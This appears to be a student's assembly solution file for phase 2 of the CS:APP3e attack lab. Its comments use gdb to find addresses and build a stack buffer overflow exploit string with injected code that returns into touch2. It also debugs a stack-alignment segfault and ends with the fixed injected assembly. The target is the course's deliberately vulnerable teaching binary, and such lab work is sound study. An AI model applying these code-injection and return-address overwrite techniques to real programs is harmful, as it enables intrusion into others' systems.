# A solution for the phase 2 of attack bomb in CS:APP3e
#
# Copyright (C) 2022 Tongjie Liu <tongjieandliu@gmail.com>.
#
# This program is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program.  If not, see <https://www.gnu.org/licenses/>.

#	Since we've already known that BUFFER_SIZE is 40, the length for
# our exploit string is 40 + 8 + 8 = 56 bytes.
#
#	The last 16 bytes are 2 addresses. The first one is of our injected
# code, and the second one is of function touch2. After returning from
# getbuf, register %rsp is incremented by 8. Therefore, the address of
# touch2 has to be stored at the address pointed by the new %rsp if we want
# to transfer control to touch2 upon the returning of our injected code.
#
#	Our cookie is 0x59b997fa, which is obtained by executing:
#	$ cat cookie.txt
#
#	To obtain the address of touch2, we simply need to use gdb:
#	$ gdb ctarget
#	(gdb) print touch2
#	$1 = {void (unsigned int)} 0x4017ec <touch2>
# Hence the address of function touch2 is 0x4017ec.
#
#	The most convenient location for our injected code is the address of
# buf, which can be obtained by using gdb:
#	(gdb) break getbuf
#	(gdb) run -q
#	(gdb) disas
#	Dump of assembler code for function getbuf:
#	=> 0x00000000004017a8 <+0>:     sub    $0x28,%rsp
#	   0x00000000004017ac <+4>:     mov    %rsp,%rdi
#	   0x00000000004017af <+7>:     callq  0x401a40 <Gets>
#	   0x00000000004017b4 <+12>:    mov    $0x1,%eax
#	   0x00000000004017b9 <+17>:    add    $0x28,%rsp
#	   0x00000000004017bd <+21>:    retq   
#	End of assembler dump.
#	(gdb) nexti
#	(gdb) print /x $rsp # note that it's $ not % in this command
#	$1 = 0x5561dc78
# Hence we could use 0x5561dc78 as the first address in the end of our exploit
# string.
#
#	Therefore, our exploit string consists of 4 part listed from lower
# addresses to higher addresses:
#	1. injected code(instructions in this file)
#	2. zeros(or any other things you like)
#	3. the address of injected code: 0x5561dc78
#	4. the address of function touch2: 0x4017ec
#
#	Here is the injected code:
#	movq	$0x59b997fa, %rdi
#	ret
# and the resulting byte codes:
#	48 c7 c7 fa 97 b9 59 c3 /* injected code */
#	00 00 00 00 00 00 00 00 /* zeros */
#	00 00 00 00 00 00 00 00 /* zeros */
#	00 00 00 00 00 00 00 00 /* zeros */
#	00 00 00 00 00 00 00 00 /* zeros */
#	78 dc 61 55 00 00 00 00 /* address of injected code in little-endian */
#	ec 17 40 00 00 00 00 00 /* address of touch2 in little-endian */
#
#	But unfortunately, this does not work perfectly, since it causes a
# segmentation fault. Although the byte codes we used as the exploit string do
# broke the stack frames of functions like getbuf and test, calling function
# touch2 and other functions touch2 calls doesn't depends on those 2 stack
# frames. The reason is more likey about data alignment. Besides, gdb told us
# some more informations about the situation:
#	$ cat phase_2.txt | ./hex2raw > raw
#	$ gdb ctarget
#	(gdb) run -q -i raw
#	Starting program: /home/liu/Downloads/attacklab/ctarget -q -i raw
#	Cookie: 0x59b997fa
#	Touch2!: You called touch2(0x59b997fa)
#	Valid solution for level 2 with target ctarget
#
#	Program received signal SIGSEGV, Segmentation fault.
#	0x00007ffff7e53f4d in _IO_str_init_static_internal (sf=sf@entry=
# 0x55619a38, 
#	    ptr=ptr@entry=0x55619c78 "", size=size@entry=8191, pstart=pstart
# @entry=0x55619c78 "")
#	    at strops.c:41
#	41      strops.c: No such file or directory.
#	(gdb) disas _IO_str_init_static_internal
#	Dump of assembler code for function _IO_str_init_static_internal:
#	   0x00007ffff7e53f10 <+0>:     endbr64 
#	   0x00007ffff7e53f14 <+4>:     push   %r13
#	   0x00007ffff7e53f16 <+6>:     mov    %rsi,%r13
#	   0x00007ffff7e53f19 <+9>:     push   %r12
#	   0x00007ffff7e53f1b <+11>:    mov    %rcx,%r12
#	   0x00007ffff7e53f1e <+14>:    push   %rbp
#	   0x00007ffff7e53f1f <+15>:    mov    %rdi,%rbp
#	   0x00007ffff7e53f22 <+18>:    push   %rbx
#	   0x00007ffff7e53f23 <+19>:    sub    $0x18,%rsp
#	   0x00007ffff7e53f27 <+23>:    test   %rdx,%rdx
#	   0x00007ffff7e53f2a <+26>:    jne    0x7ffff7e53f98 <_IO_str_init
# _static_internal+136>
#	   0x00007ffff7e53f2c <+28>:    xor    %esi,%esi
#	   0x00007ffff7e53f2e <+30>:    mov    %r13,%rdi
#	   0x00007ffff7e53f31 <+33>:    callq  0x7ffff7de25d0 <*ABS*+0xa4dd0@plt>
#	   0x00007ffff7e53f36 <+38>:    mov    %rax,%rbx
#	   0x00007ffff7e53f39 <+41>:    movq   %r13,%xmm0
#	   0x00007ffff7e53f3e <+46>:    xor    %ecx,%ecx
#	   0x00007ffff7e53f40 <+48>:    mov    %rbx,%rdx
#	   0x00007ffff7e53f43 <+51>:    mov    %r13,%rsi
#	   0x00007ffff7e53f46 <+54>:    punpcklqdq %xmm0,%xmm0
#	   0x00007ffff7e53f4a <+58>:    mov    %rbp,%rdi
#	=> 0x00007ffff7e53f4d <+61>:    movaps %xmm0,(%rsp)
#	   0x00007ffff7e53f51 <+65>:    callq  0x7ffff7e51fa0 <__GI__IO_setb>
#	   0x00007ffff7e53f56 <+70>:    movdqa (%rsp),%xmm0
#	   0x00007ffff7e53f5b <+75>:    mov    %r13,0x8(%rbp)
#	   0x00007ffff7e53f5f <+79>:    movups %xmm0,0x18(%rbp)
#	   0x00007ffff7e53f63 <+83>:    test   %r12,%r12
#	   0x00007ffff7e53f66 <+86>:    je     0x7ffff7e53fb0 <_IO_str_init_
# static_internal+160>
#	   0x00007ffff7e53f68 <+88>:    movq   %r12,%xmm0
#	   0x00007ffff7e53f6d <+93>:    movq   %rbx,%xmm1
#	   0x00007ffff7e53f72 <+98>:    mov    %r12,0x10(%rbp)
#	   0x00007ffff7e53f76 <+102>:   punpcklqdq %xmm1,%xmm0
#	   0x00007ffff7e53f7a <+106>:   movups %xmm0,0x28(%rbp)
#	   0x00007ffff7e53f7e <+110>:   movq   $0x0,0xe0(%rbp)
#	   0x00007ffff7e53f89 <+121>:   add    $0x18,%rsp
#	   0x00007ffff7e53f8d <+125>:   pop    %rbx
#	   0x00007ffff7e53f8e <+126>:   pop    %rbp
#	   0x00007ffff7e53f8f <+127>:   pop    %r12
#	   0x00007ffff7e53f91 <+129>:   pop    %r13
#	   0x00007ffff7e53f93 <+131>:   retq   
#	   0x00007ffff7e53f94 <+132>:   nopl   0x0(%rax)
#	   0x00007ffff7e53f98 <+136>:   add    %rsi,%rdx
#	   0x00007ffff7e53f9b <+139>:   mov    $0xffffffffffffffff,%rbx
#	   0x00007ffff7e53fa2 <+146>:   cmp    %rdx,%rsi
#	   0x00007ffff7e53fa5 <+149>:   cmovb  %rdx,%rbx
#	   0x00007ffff7e53fa9 <+153>:   jmp    0x7ffff7e53f39 <_IO_str_init_
# static_internal+41>
#	   0x00007ffff7e53fab <+155>:   nopl   0x0(%rax,%rax,1)
#	   0x00007ffff7e53fb0 <+160>:   mov    %rbx,0x10(%rbp)
#	   0x00007ffff7e53fb4 <+164>:   movups %xmm0,0x28(%rbp)
#	   0x00007ffff7e53fb8 <+168>:   jmp    0x7ffff7e53f7e <_IO_str_init_
# static_internal+110>
#	End of assembler dump.
# It seems we need a data alignment of 16 bytes, since the problem involving
# floating register %xmm0 on line <_IO_str_init_static_internal+61>, and some
# SSE intsructions need this mandatory data alignment described on book page
# 276.
#
#	There is simple solution to this problem. We only need to add 8 bytes
# of padding after the return value of test which is the caller of getbuf in
# the stack frame of getbuf.
	movq	$0x59b997fa, %rdi # cookie as the first argument
	popq	%rax
	pushq	%rax # 8 bytes padding for data alignment
	pushq	%rax
	ret
